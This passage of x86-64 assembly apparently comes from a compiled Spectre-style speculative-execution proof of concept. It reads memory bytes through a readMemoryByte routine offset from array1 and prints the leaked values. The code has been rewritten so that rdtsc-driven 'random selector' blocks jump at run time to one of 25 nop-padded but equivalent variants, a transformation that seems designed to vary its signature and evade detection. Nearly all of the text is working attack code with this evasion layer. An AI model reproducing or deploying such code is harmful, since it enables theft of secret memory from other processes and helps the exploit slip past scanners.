	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 14
.Lmain_win4_var14:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 15
.Lmain_win4_var15:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	nop
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 16
.Lmain_win4_var16:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 17
.Lmain_win4_var17:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 18
.Lmain_win4_var18:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 19
.Lmain_win4_var19:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 20
.Lmain_win4_var20:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	nop
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 21
.Lmain_win4_var21:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 22
.Lmain_win4_var22:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 23
.Lmain_win4_var23:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 24
.Lmain_win4_var24:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
.Lmain_win4_continue:
	movb	$0, %al
	callq	_sscanf
	movq	-48(%rbp), %rax
	leaq	_array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, -48(%rbp)
	movq	-32(%rbp), %rax
	movq	24(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-52(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
LBB2_8:
	movl	-36(%rbp), %esi
	leaq	L_.str.3(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.4(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.5(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.6(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.7(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.8(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.9(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.10(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-52(%rbp), %esi
	leaq	L_.str.11(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB2_9:                                 ## =>This Inner Loop Header: Depth=1
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win3_var0
	cmpl	$1, %eax
	je	.Lmain_win3_var1
	cmpl	$2, %eax
	je	.Lmain_win3_var2
	cmpl	$3, %eax
	je	.Lmain_win3_var3
	cmpl	$4, %eax
	je	.Lmain_win3_var4
	cmpl	$5, %eax
	je	.Lmain_win3_var5
	cmpl	$6, %eax
	je	.Lmain_win3_var6
	cmpl	$7, %eax
	je	.Lmain_win3_var7
	cmpl	$8, %eax
	je	.Lmain_win3_var8
	cmpl	$9, %eax
	je	.Lmain_win3_var9
	cmpl	$10, %eax
	je	.Lmain_win3_var10
	cmpl	$11, %eax
	je	.Lmain_win3_var11
	cmpl	$12, %eax
	je	.Lmain_win3_var12
	cmpl	$13, %eax
	je	.Lmain_win3_var13
	cmpl	$14, %eax
	je	.Lmain_win3_var14
	cmpl	$15, %eax
	je	.Lmain_win3_var15
	cmpl	$16, %eax
	je	.Lmain_win3_var16
	cmpl	$17, %eax
	je	.Lmain_win3_var17
	cmpl	$18, %eax
	je	.Lmain_win3_var18
	cmpl	$19, %eax
	je	.Lmain_win3_var19
	cmpl	$20, %eax
	je	.Lmain_win3_var20
	cmpl	$21, %eax
	je	.Lmain_win3_var21
	cmpl	$22, %eax
	je	.Lmain_win3_var22
	cmpl	$23, %eax
	je	.Lmain_win3_var23
	cmpl	$24, %eax
	je	.Lmain_win3_var24
	jmp	.Lmain_win3_var0
## Variant 0
.Lmain_win3_var0:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 1
.Lmain_win3_var1:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 2
.Lmain_win3_var2:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 3
.Lmain_win3_var3:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 4
.Lmain_win3_var4:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 5
.Lmain_win3_var5:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	nop
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 6
.Lmain_win3_var6:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 7
.Lmain_win3_var7:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 8
.Lmain_win3_var8:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 9
.Lmain_win3_var9:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 10
.Lmain_win3_var10:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	nop
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	nop
	nop
	jmp	.Lmain_win3_continue
## Variant 11
.Lmain_win3_var11:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 12
.Lmain_win3_var12:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 13
.Lmain_win3_var13:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 14
.Lmain_win3_var14:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 15
.Lmain_win3_var15:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 16
.Lmain_win3_var16:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 17
.Lmain_win3_var17:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 18
.Lmain_win3_var18:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	nop
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 19
.Lmain_win3_var19:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 20
.Lmain_win3_var20:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 21
.Lmain_win3_var21:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 22
.Lmain_win3_var22:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
## Variant 23
.Lmain_win3_var23:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 24
.Lmain_win3_var24:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-48(%rbp), %r10
	movq	(%r10), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	-36(%rbp), %r10
	movl	(%r10), %edi
	jmp	.Lmain_win3_continue
.Lmain_win3_continue:
	movq	-48(%rbp), %rsi
	movq	%rsi, %rax
	addq	$1, %rax
	movq	%rax, -48(%rbp)
	leaq	-54(%rbp), %rdx
	leaq	-16(%rbp), %rcx
	callq	_readMemoryByte
	movl	-16(%rbp), %ecx
	movl	-12(%rbp), %edx
	shll	%edx
	leaq	L_.str.15(%rip), %rsi
	leaq	L_.str.14(%rip), %rax
	cmpl	%edx, %ecx
	cmovgeq	%rax, %rsi
	leaq	L_.str.13(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movzbl	-54(%rbp), %eax
	movl	%eax, -64(%rbp)    # # 4-byte Spill
	movzbl	-54(%rbp), %eax
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win2_var0
	cmpl	$1, %eax
	je	.Lmain_win2_var1
	cmpl	$2, %eax
	je	.Lmain_win2_var2
	cmpl	$3, %eax
	je	.Lmain_win2_var3
	cmpl	$4, %eax
	je	.Lmain_win2_var4
	cmpl	$5, %eax
	je	.Lmain_win2_var5
	cmpl	$6, %eax
	je	.Lmain_win2_var6
	cmpl	$7, %eax
	je	.Lmain_win2_var7
	cmpl	$8, %eax
	je	.Lmain_win2_var8
	cmpl	$9, %eax
	je	.Lmain_win2_var9
	cmpl	$10, %eax
	je	.Lmain_win2_var10
	cmpl	$11, %eax
	je	.Lmain_win2_var11
	cmpl	$12, %eax
	je	.Lmain_win2_var12
	cmpl	$13, %eax
	je	.Lmain_win2_var13
	cmpl	$14, %eax
	je	.Lmain_win2_var14
	cmpl	$15, %eax
	je	.Lmain_win2_var15
	cmpl	$16, %eax
	je	.Lmain_win2_var16
	cmpl	$17, %eax
	je	.Lmain_win2_var17
	cmpl	$18, %eax
	je	.Lmain_win2_var18
	cmpl	$19, %eax
	je	.Lmain_win2_var19
	cmpl	$20, %eax
	je	.Lmain_win2_var20
	cmpl	$21, %eax
	je	.Lmain_win2_var21
	cmpl	$22, %eax
	je	.Lmain_win2_var22
	cmpl	$23, %eax
	je	.Lmain_win2_var23
	cmpl	$24, %eax
	je	.Lmain_win2_var24
	jmp	.Lmain_win2_var0
## Variant 0
.Lmain_win2_var0:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 1
.Lmain_win2_var1:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win2_continue
## Variant 2
.Lmain_win2_var2:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 3
.Lmain_win2_var3:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 4
.Lmain_win2_var4:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 5
.Lmain_win2_var5:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 6
.Lmain_win2_var6:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 7
.Lmain_win2_var7:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 8
.Lmain_win2_var8:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 9
.Lmain_win2_var9:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 10
.Lmain_win2_var10:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 11
.Lmain_win2_var11:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 12
.Lmain_win2_var12:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 13
.Lmain_win2_var13:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 14
.Lmain_win2_var14:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 15
.Lmain_win2_var15:
	popq	%rax
	cmpl	$31, %eax
	nop
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 16
.Lmain_win2_var16:
	popq	%rax
	cmpl	$31, %eax
	nop
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 17
.Lmain_win2_var17:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 18
.Lmain_win2_var18:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 19
.Lmain_win2_var19:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 20
.Lmain_win2_var20:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 21
.Lmain_win2_var21:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 22
.Lmain_win2_var22:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
